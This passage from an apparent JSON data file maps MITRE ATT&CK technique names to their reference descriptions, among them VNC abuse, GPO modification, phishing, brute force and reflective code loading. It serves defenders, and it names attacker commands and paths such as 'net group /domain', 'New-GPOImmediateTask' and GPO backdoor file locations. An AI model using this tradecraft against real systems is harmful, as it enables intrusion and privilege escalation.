    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)"
  ],
  "domain policy modification: group policy modification": [
    "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)"
  ],
  "develop capabilities: malware": [
    "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)"
  ],
  "impair defenses: disable or modify system firewall": [
    "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. "
  ],
  "gather victim identity information: email addresses": [
    "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "scheduled task/job: cron": [
    "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). "
  ],
  "hide artifacts: ntfs file attributes": [
    "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)"
  ],
  "phishing for information: spearphishing link": [
    "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. \n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures."
  ],
  "phishing": [
    "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source."
  ],
  "permission groups discovery: domain groups": [
    "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups."
  ],
  "system binary proxy execution: compiled html file": [
    "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)"
  ],
  "account discovery: email account": [
    "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)"
  ],
  "proxy: internal proxy": [
    "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems."
  ],
  "establish accounts: email accounts": [
    "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)"
  ],
  "acquire infrastructure: web services": [
    "Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them."
  ],
  "data from network shared drive": [
    "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information."
  ],
  "trusted relationship": [
    "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)"
  ],
  "dynamic resolution": [
    "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)"
  ],
  "stage capabilities: upload malware": [
    "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin.(Citation: Volexity Ocean Lotus November 2020)\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files."
  ],
  "account access removal": [
    "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy. \n\nAdversaries who use ransomware may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. "
  ],
  "establish accounts: social media accounts": [
    "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
  ],
  "taint shared content": [
    "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS."
  ],
  "obtain capabilities: code signing certificates": [
    "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party."
  ],
  "remote services: ssh": [
    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
  ],
  "exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol": [
    "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. "
  ],
  "credentials from password stores": [
    "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information."
  ],
  "system services": [
    "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution."
  ],
  "replication through removable media": [
    "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled)."
  ],
  "application layer protocol: dns": [
    "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) "
  ],
  "application layer protocol: file transfer protocols": [
    "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. "
  ],
  "brute force: password guessing": [
    "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
  ],
  "multi-stage channels": [
    "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked."
  ],
  "inter-process communication: component object model": [
    "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)"
  ],
  "data manipulation: stored data manipulation": [
    "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
  ],
  "valid accounts: local accounts": [
    "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. "
  ],
  "automated exfiltration": [
    "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)."
  ],
  "firmware corruption": [
    "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). "
  ],
  "reflective code loading": [
    "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)"
  ],
  "internal spearphishing": [
    "Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)\n\nAdversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.\n\nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)"
  ],
  "network sniffing": [
